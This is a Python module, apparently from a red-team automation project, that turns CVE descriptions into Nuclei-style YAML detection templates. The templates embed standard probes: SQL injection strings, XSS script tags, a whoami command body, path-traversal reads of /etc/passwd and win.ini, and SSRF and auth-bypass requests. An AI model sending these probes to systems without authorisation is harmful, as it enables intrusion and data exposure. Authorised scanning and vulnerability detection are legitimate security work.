#!/usr/bin/env python3
"""
AI辅助PoC生成器 - 基于规则匹配的智能模板生成
功能: 根据CVE描述生成YAML格式PoC模板
作者: AutoRedTeam-Orchestrator
技术: 纯规则匹配 (无需外部AI API)
"""

import logging
import re
from dataclasses import dataclass
from enum import Enum
from typing import Dict, List

logger = logging.getLogger(__name__)


class VulnType(Enum):
    """漏洞类型枚举"""

    SQL_INJECTION = "sqli"
    XSS = "xss"
    RCE = "rce"
    PATH_TRAVERSAL = "path_traversal"
    SSRF = "ssrf"
    AUTH_BYPASS = "auth_bypass"
    XXE = "xxe"
    FILE_UPLOAD = "file_upload"
    COMMAND_INJECTION = "cmd_injection"
    IDOR = "idor"
    UNKNOWN = "unknown"


@dataclass
class CVEInfo:
    """CVE信息提取结果"""

    cve_id: str
    description: str
    severity: str
    vuln_type: VulnType
    product: str = ""
    version: str = ""
    affected_path: str = ""
    keywords: List[str] = None


class KeywordMatcher:
    """关键词匹配器 - 识别漏洞类型"""

    # 漏洞类型关键词映射
    VULN_KEYWORDS = {
        VulnType.SQL_INJECTION: [
            "sql injection",
            "sqli",
            "sql query",
            "database query",
            "blind sql",
            "union select",
            "time-based sql",
        ],
        VulnType.XSS: [
            "cross-site scripting",
            "xss",
            "reflected xss",
            "stored xss",
            "dom xss",
            "script injection",
            "html injection",
        ],
        VulnType.RCE: [
            "remote code execution",
            "rce",
            "code execution",
            "arbitrary code",
            "execute code",
            "command execution",
        ],
        VulnType.PATH_TRAVERSAL: [
            "path traversal",
            "directory traversal",
            "file inclusion",
            "local file inclusion",
            "lfi",
            "../",
            "arbitrary file",
        ],
        VulnType.SSRF: [
            "server-side request forgery",
            "ssrf",
            "internal network",
            "request forgery",
            "blind ssrf",
        ],
        VulnType.AUTH_BYPASS: [
            "authentication bypass",
            "auth bypass",
            "login bypass",
            "unauthorized access",
            "privilege escalation",
            "access control",
        ],
        VulnType.XXE: [
            "xml external entity",
            "xxe",
            "xml injection",
            "entity expansion",
            "external entity",
        ],
        VulnType.FILE_UPLOAD: [
            "file upload",
            "arbitrary file upload",
            "unrestricted upload",
            "upload vulnerability",
            "malicious file",
        ],
        VulnType.COMMAND_INJECTION: [
            "command injection",
            "os command",
            "shell injection",
            "arbitrary command",
            "system command",
        ],
        VulnType.IDOR: [
            "insecure direct object reference",
            "idor",
            "object reference",
            "access control",
            "unauthorized access",
        ],
    }

    @staticmethod
    def identify_vuln_type(description: str) -> VulnType:
        """
        识别漏洞类型

        Args:
            description: CVE描述

        Returns:
            识别到的漏洞类型
        """
        description_lower = description.lower()

        # 计算每种漏洞类型的匹配分数
        scores = {}
        for vuln_type, keywords in KeywordMatcher.VULN_KEYWORDS.items():
            score = sum(1 for kw in keywords if kw in description_lower)
            if score > 0:
                scores[vuln_type] = score

        if not scores:
            return VulnType.UNKNOWN

        # 返回得分最高的漏洞类型
        return max(scores.items(), key=lambda x: x[1])[0]


class CVEParser:
    """CVE描述解析器"""

    # 产品名称正则 (常见格式)
    PRODUCT_PATTERNS = [
        r"in\s+([A-Z][a-zA-Z0-9\s]+)\s+(?:before|prior to|through)",
        r"([A-Z][a-zA-Z0-9\s]+)\s+version",
        r"([A-Z][a-zA-Z0-9\s]+)\s+\d+\.\d+",
        r"affects\s+([A-Z][a-zA-Z0-9\s]+)",
    ]

    # 版本号正则
    VERSION_PATTERNS = [
        r"version\s+(\d+\.\d+(?:\.\d+)?)",
        r"before\s+(\d+\.\d+(?:\.\d+)?)",
        r"prior to\s+(\d+\.\d+(?:\.\d+)?)",
        r"through\s+(\d+\.\d+(?:\.\d+)?)",
        r"(\d+\.\d+\.\d+)",
    ]

    # 路径/端点正则
    PATH_PATTERNS = [
        r"(/[a-zA-Z0-9/_-]+\.(?:php|jsp|asp|aspx|do|action))",
        r"endpoint\s+([/a-zA-Z0-9/_-]+)",
        r"path\s+([/a-zA-Z0-9/_-]+)",
        r"url\s+([/a-zA-Z0-9/_-]+)",
    ]

    @staticmethod
    def extract_product(description: str) -> str:
        """提取产品名称"""
        for pattern in CVEParser.PRODUCT_PATTERNS:
            match = re.search(pattern, description, re.IGNORECASE)
            if match:
                product = match.group(1).strip()
                # 清理产品名 (只保留有效字符)
                product = re.sub(r"\s+", " ", product)
                return product[:50]  # 限制长度
        return "Unknown Product"

    @staticmethod
    def extract_version(description: str) -> str:
        """提取版本号"""
        for pattern in CVEParser.VERSION_PATTERNS:
            match = re.search(pattern, description, re.IGNORECASE)
            if match:
                return match.group(1)
        return ""

    @staticmethod
    def extract_path(description: str) -> str:
        """提取受影响路径"""
        for pattern in CVEParser.PATH_PATTERNS:
            match = re.search(pattern, description, re.IGNORECASE)
            if match:
                return match.group(1)
        return ""

    @staticmethod
    def extract_keywords(description: str) -> List[str]:
        """提取关键词"""
        # 提取技术关键词
        keywords = []

        # 常见技术词
        tech_words = [
            "parameter",
            "GET",
            "POST",
            "header",
            "cookie",
            "authentication",
            "session",
            "token",
            "api",
        ]

        description_lower = description.lower()
        for word in tech_words:
            if word.lower() in description_lower:
                keywords.append(word)

        return keywords[:10]  # 限制数量


class PoCTemplateGenerator:
    """PoC模板生成器"""

    @staticmethod
    def generate_sqli_template(cve_info: CVEInfo) -> Dict:
        """生成SQL注入检测模板"""
        path = cve_info.affected_path or "/search"
        param = "id" if "id" in cve_info.description.lower() else "q"

        return {
            "id": cve_info.cve_id,
            "info": {
                "name": f"{cve_info.product} - SQL Injection",
                "severity": cve_info.severity,
                "description": f"SQL injection vulnerability in {cve_info.product}",
                "tags": ["sqli", "injection", cve_info.cve_id.lower()],
                "classification": {"cve-id": cve_info.cve_id, "cwe-id": "CWE-89"},
            },
            "requests": [
                {
                    "method": "GET",
                    "path": [
                        f"{{{{BaseURL}}}}{path}?{param}=1' OR '1'='1",
                        f"{{{{BaseURL}}}}{path}?{param}=1' AND SLEEP(5)--",
                    ],
                    "matchers": [
                        {
                            "type": "word",
                            "words": [
                                "mysql_fetch",
                                "syntax error",
                                "SQL syntax",
                                "mysqli_",
                                "pg_query",
                            ],
                            "part": "body",
                            "condition": "or",
                        },
                        {"type": "status", "status": [200, 500]},
                    ],
                    "matchers-condition": "and",
                }
            ],
        }

    @staticmethod
    def generate_xss_template(cve_info: CVEInfo) -> Dict:
        """生成XSS检测模板"""
        path = cve_info.affected_path or "/search"
        param = "search" if "search" in cve_info.description.lower() else "q"

        return {
            "id": cve_info.cve_id,
            "info": {
                "name": f"{cve_info.product} - Cross-Site Scripting",
                "severity": cve_info.severity,
                "description": f"XSS vulnerability in {cve_info.product}",
                "tags": ["xss", "injection", cve_info.cve_id.lower()],
                "classification": {"cve-id": cve_info.cve_id, "cwe-id": "CWE-79"},
            },
            "requests": [
                {
                    "method": "GET",
                    "path": [
                        f"{{{{BaseURL}}}}{path}?{param}=<script>alert(1)</script>",
                        f"{{{{BaseURL}}}}{path}?{param}=<img src=x onerror=alert(1)>",
                    ],
                    "matchers": [
                        {
                            "type": "word",
                            "words": [
                                "<script>alert(1)</script>",
                                "<img src=x onerror=alert(1)>",
                                "onerror=alert",
                            ],
                            "part": "body",
                            "condition": "or",
                        },
                        {"type": "word", "words": ["text/html"], "part": "header"},
                    ],
                    "matchers-condition": "and",
                }
            ],
        }

    @staticmethod
    def generate_rce_template(cve_info: CVEInfo) -> Dict:
        """生成RCE检测模板"""
        path = cve_info.affected_path or "/cmd"

        return {
            "id": cve_info.cve_id,
            "info": {
                "name": f"{cve_info.product} - Remote Code Execution",
                "severity": cve_info.severity,
                "description": f"RCE vulnerability in {cve_info.product}",
                "tags": ["rce", "code-execution", cve_info.cve_id.lower()],
                "classification": {"cve-id": cve_info.cve_id, "cwe-id": "CWE-94"},
            },
            "requests": [
                {
                    "method": "POST",
                    "path": [f"{{{{BaseURL}}}}{path}"],
                    "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                    "body": "cmd=whoami&payload={{randstr}}",
                    "matchers": [
                        {
                            "type": "word",
                            "words": ["root@", "nt authority\\system", "uid=", "gid="],
                            "part": "body",
                            "condition": "or",
                        },
                        {"type": "status", "status": [200]},
                    ],
                    "matchers-condition": "and",
                }
            ],
        }

    @staticmethod
    def generate_path_traversal_template(cve_info: CVEInfo) -> Dict:
        """生成路径遍历检测模板"""
        path = cve_info.affected_path or "/download"

        return {
            "id": cve_info.cve_id,
            "info": {
                "name": f"{cve_info.product} - Path Traversal",
                "severity": cve_info.severity,
                "description": f"Path traversal vulnerability in {cve_info.product}",
                "tags": ["lfi", "path-traversal", cve_info.cve_id.lower()],
                "classification": {"cve-id": cve_info.cve_id, "cwe-id": "CWE-22"},
            },
            "requests": [
                {
                    "method": "GET",
                    "path": [
                        f"{{{{BaseURL}}}}{path}?file=../../../../../../etc/passwd",
                        f"{{{{BaseURL}}}}{path}?file=..\\..\\..\\..\\windows\\win.ini",
                    ],
                    "matchers": [
                        {
                            "type": "word",
                            "words": ["root:x:0:0:", "[fonts]", "for 16-bit app support"],
                            "part": "body",
                            "condition": "or",
                        },
                        {"type": "status", "status": [200]},
                    ],
                    "matchers-condition": "and",
                }
            ],
        }

    @staticmethod
    def generate_ssrf_template(cve_info: CVEInfo) -> Dict:
        """生成SSRF检测模板"""
        path = cve_info.affected_path or "/fetch"

        return {
            "id": cve_info.cve_id,
            "info": {
                "name": f"{cve_info.product} - Server-Side Request Forgery",
                "severity": cve_info.severity,
                "description": f"SSRF vulnerability in {cve_info.product}",
                "tags": ["ssrf", cve_info.cve_id.lower()],
                "classification": {"cve-id": cve_info.cve_id, "cwe-id": "CWE-918"},
            },
            "requests": [
                {
                    "method": "GET",
                    "path": [
                        f"{{{{BaseURL}}}}{path}?url=http://{{{{interactsh-url}}}}",
                        f"{{{{BaseURL}}}}{path}?url=http://127.0.0.1:80",
                    ],
                    "matchers": [
                        {
                            "type": "word",
                            "words": ["localhost", "127.0.0.1", "internal", "metadata"],
                            "part": "body",
                            "condition": "or",
                        },
                        {"type": "status", "status": [200]},
                    ],
                    "matchers-condition": "and",
                }
            ],
        }

    @staticmethod
    def generate_auth_bypass_template(cve_info: CVEInfo) -> Dict:
        """生成认证绕过检测模板"""
        path = cve_info.affected_path or "/admin"

        return {
            "id": cve_info.cve_id,
            "info": {
                "name": f"{cve_info.product} - Authentication Bypass",
                "severity": cve_info.severity,
                "description": f"Authentication bypass in {cve_info.product}",
                "tags": ["auth-bypass", cve_info.cve_id.lower()],
                "classification": {"cve-id": cve_info.cve_id, "cwe-id": "CWE-287"},
            },
            "requests": [
                {
                    "method": "GET",
                    "path": [f"{{{{BaseURL}}}}{path}", f"{{{{BaseURL}}}}{path}/../admin"],
                    "headers": {"X-Original-URL": "/admin", "X-Forwarded-For": "127.0.0.1"},
                    "matchers": [
                        {
                            "type": "word",
                            "words": ["admin panel", "dashboard", "administration", "logout"],
                            "part": "body",
                            "condition": "or",
                        },
                        {"type": "status", "status": [200]},
                    ],
                    "matchers-condition": "and",
                }
            ],
        }

    @staticmethod
    def generate_generic_template(cve_info: CVEInfo) -> Dict:
        """生成通用检测模板"""
        path = cve_info.affected_path or "/"

        return {
            "id": cve_info.cve_id,
            "info": {
                "name": f"{cve_info.product} - Vulnerability Detection",
                "severity": cve_info.severity,
                "description": f"Vulnerability in {cve_info.product}",
                "tags": [cve_info.cve_id.lower()],
                "classification": {"cve-id": cve_info.cve_id},
            },
            "requests": [
                {
                    "method": "GET",
                    "path": [f"{{{{BaseURL}}}}{path}"],
                    "matchers": [
                        {
                            "type": "word",
                            "words": ["error", "exception", "vulnerable", "debug"],
                            "part": "body",
                            "condition": "or",
                        },
                        {"type": "status", "status": [200, 500]},
                    ],
                    "matchers-condition": "or",
                }
            ],
        }


class AIPoCGenerator:
    """
    AI辅助PoC生成器主类

    Usage:
        generator = AIPoCGenerator()

        # 生成PoC模板
        template = generator.generate_poc(
            cve_id="CVE-2024-1234",
            cve_description="SQL injection in WordPress plugin...",
            severity="high"
        )

        print(template)  # YAML格式字符串
    """

    def __init__(self):
        """初始化生成器"""
        self.keyword_matcher = KeywordMatcher()
        self.cve_parser = CVEParser()
        self.template_generator = PoCTemplateGenerator()

    def generate_poc(self, cve_id: str, cve_description: str, severity: str = "medium") -> str:
        """
        生成PoC YAML模板

        Args:
            cve_id: CVE编号 (如 CVE-2024-1234)
            cve_description: CVE描述
            severity: 严重性级别 (info/low/medium/high/critical)

        Returns:
            YAML格式的PoC模板字符串
        """
        try:
            # 1. 解析CVE信息
            cve_info = self._parse_cve(cve_id, cve_description, severity)

            # 2. 识别漏洞类型
            cve_info.vuln_type = self.keyword_matcher.identify_vuln_type(cve_description)

            # 3. 生成对应模板
            template_dict = self._generate_template(cve_info)

            # 4. 转换为YAML字符串
            yaml_str = self._dict_to_yaml(template_dict)

            return yaml_str

        except Exception as e:
            logger.error(f"生成PoC失败: {e}")
            # 返回最小可用模板
            return self._generate_minimal_template(cve_id, severity)

    def _parse_cve(self, cve_id: str, description: str, severity: str) -> CVEInfo:
        """解析CVE信息"""
        return CVEInfo(
            cve_id=cve_id,
            description=description,
            severity=severity,
            vuln_type=VulnType.UNKNOWN,
            product=self.cve_parser.extract_product(description),
            version=self.cve_parser.extract_version(description),
            affected_path=self.cve_parser.extract_path(description),
            keywords=self.cve_parser.extract_keywords(description),
        )

    def _generate_template(self, cve_info: CVEInfo) -> Dict:
        """根据漏洞类型生成模板"""
        generators = {
            VulnType.SQL_INJECTION: self.template_generator.generate_sqli_template,
            VulnType.XSS: self.template_generator.generate_xss_template,
            VulnType.RCE: self.template_generator.generate_rce_template,
            VulnType.PATH_TRAVERSAL: self.template_generator.generate_path_traversal_template,
            VulnType.SSRF: self.template_generator.generate_ssrf_template,
            VulnType.AUTH_BYPASS: self.template_generator.generate_auth_bypass_template,
        }

        generator = generators.get(
            cve_info.vuln_type, self.template_generator.generate_generic_template
        )

        return generator(cve_info)

    def _dict_to_yaml(self, template_dict: Dict) -> str:
        """
        将字典转换为YAML格式字符串

        使用yaml.dump以正确处理特殊字符转义
        """
        import yaml

        # 使用yaml.dump自动处理转义
        yaml_str = yaml.dump(
            template_dict, allow_unicode=True, default_flow_style=False, sort_keys=False
        )

        return yaml_str

    def _generate_minimal_template(self, cve_id: str, severity: str) -> str:
        """生成最小可用模板 (失败时兜底)"""
        return f"""id: {cve_id}

info:
  name: {cve_id} - Vulnerability Detection
  severity: {severity}
  description: Auto-generated PoC template
  tags:
    - {cve_id.lower()}

requests:
  - method: GET
    path:
      - "{{{{BaseURL}}}}/"
    matchers:
      - type: status
        status:
          - 200
"""


# 便捷函数
def generate_poc(cve_id: str, cve_description: str, severity: str = "medium") -> str:
    """
    生成PoC模板 (便捷函数)

    Args:
        cve_id: CVE编号
        cve_description: CVE描述
        severity: 严重性级别

    Returns:
        YAML格式的PoC模板
    """
    generator = AIPoCGenerator()
    return generator.generate_poc(cve_id, cve_description, severity)


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO, format="%(levelname)s: %(message)s")
    # 测试示例
    logger.info("AI PoC Generator - 测试")
    logger.info("=" * 60)

    # 测试1: SQL注入
    logger.info("\n[Test 1] SQL Injection PoC")
    logger.info("-" * 60)
    sqli_poc = generate_poc(
        cve_id="CVE-2024-1234",
        cve_description="A SQL injection vulnerability in WordPress Plugin "
        "Contact Form 7 version 5.8.1 allows remote attackers "
        "to execute arbitrary SQL commands via the id parameter.",
        severity="high",
    )
    logger.info(sqli_poc)

    # 测试2: XSS
    logger.info("\n[Test 2] XSS PoC")
    logger.info("-" * 60)
    xss_poc = generate_poc(
        cve_id="CVE-2024-5678",
        cve_description="Cross-site scripting (XSS) vulnerability in Joomla 4.2.0 "
        "allows attackers to inject arbitrary JavaScript via the search parameter.",
        severity="medium",
    )
    logger.info(xss_poc)

    # 测试3: RCE
    logger.info("\n[Test 3] RCE PoC")
    logger.info("-" * 60)
    rce_poc = generate_poc(
        cve_id="CVE-2024-9999",
        cve_description="Remote code execution in Apache Struts 2.5.30 "
        "allows attackers to execute arbitrary code via OGNL injection.",
        severity="critical",
    )
    logger.info(rce_poc)

    logger.info("\n" + "=" * 60)
    logger.info("测试完成!")
